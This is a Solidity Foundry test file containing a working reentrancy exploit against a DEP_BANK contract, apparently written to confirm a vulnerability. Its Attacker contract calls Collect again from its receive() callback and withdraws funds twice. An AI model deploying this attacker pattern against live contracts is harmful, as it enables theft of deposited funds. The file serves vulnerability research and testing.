
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {DEP_BANK,LogFile} from "../src/DEP_BANK.sol";

contract TestReentrancyDEP_BANK is Test {
    DEP_BANK public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        LogFile log = new LogFile();
        _contractUnderTest = new DEP_BANK();
        _contractUnderTest.SetLogFile(address(log));
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max / 2);
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    DEP_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackValue;

    constructor(address victimAddress) { 
        victim = DEP_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackValue = val;
        
        victim.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackValue = val;
        
        victim.Collect(val);

        if (attackCallCount == 2 && address(this).balance == initialSnapshot + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount == 0) {
            attackCallCount = 1;
            victim.Collect(storedAttackValue);
        } else if (attackCallCount == 1) {
            attackCallCount = 2;
        }
    }

    fallback() external payable {}
}
